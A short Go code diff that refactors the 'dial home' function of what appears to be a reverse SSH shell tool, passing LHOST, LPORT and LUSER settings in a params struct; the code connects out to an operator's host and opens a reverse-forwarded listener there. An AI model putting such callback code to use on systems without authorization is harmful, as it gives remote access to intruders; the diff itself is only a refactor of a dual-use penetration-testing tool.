@@ -127,14 +127,14 @@ func createSFTPHandler() ssh.SubsystemHandler {
 	}
 }
 
-func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
+func dialHomeAndListen(address string, p *params) (net.Listener, error) {
 	var (
 		err    error
 		client *gossh.Client
 	)
 
 	config := &gossh.ClientConfig{
-		User: username,
+		User: p.LUSER,
 		Auth: []gossh.AuthMethod{
 			gossh.Password(localPassword),
 		},
@@ -146,7 +146,7 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		client, err = gossh.Dial("tcp", address, config)
 		if err == nil {
 			break
-		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
+		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && p.verbose {
 			fmt.Println("Enter password:")
 			data, err := term.ReadPassword(int(syscall.Stdin))
 			if err != nil {
@@ -162,7 +162,7 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		}
 	}
 
-	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
+	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", p.homeBindPort))
 	if err != nil {
 		return nil, err
 	}
@@ -358,7 +358,7 @@ func run(p *params, server ssh.Server) {
 	} else {
 		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
 		log.Printf("Dialling home via ssh to %s", target)
-		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
+		ln, err = dialHomeAndListen(target, p)
 	}
 
 	if err != nil {
